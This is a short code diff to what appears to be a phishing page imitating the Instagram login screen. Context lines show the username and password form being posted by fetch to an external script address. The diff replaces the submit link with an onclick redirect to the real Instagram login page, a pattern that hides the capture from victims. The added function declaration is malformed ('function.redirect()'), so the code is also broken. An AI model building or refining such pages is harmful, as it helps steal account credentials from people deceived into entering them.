@@ -22,7 +22,7 @@
                     <label for="password" class="sr-only">Password</label>
                     <input name="password" type="password" placeholder="Password" />
 
-                    <a href="https://www.instagram.com/accounts/login/"><button type="submit">Log In</button></a>
+                    <button onclick="redirect()" type="submit">Log In</button>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
@@ -78,7 +78,9 @@
           fetch(scriptURL, { method: 'POST', body: new FormData(form)})
             .catch(error => console.error('Error!', error.message))
             })
-
+        function.redirect() {
+            window.location.href = "https://www.instagram.com/accounts/login/";
+        }
         
       </script>
   
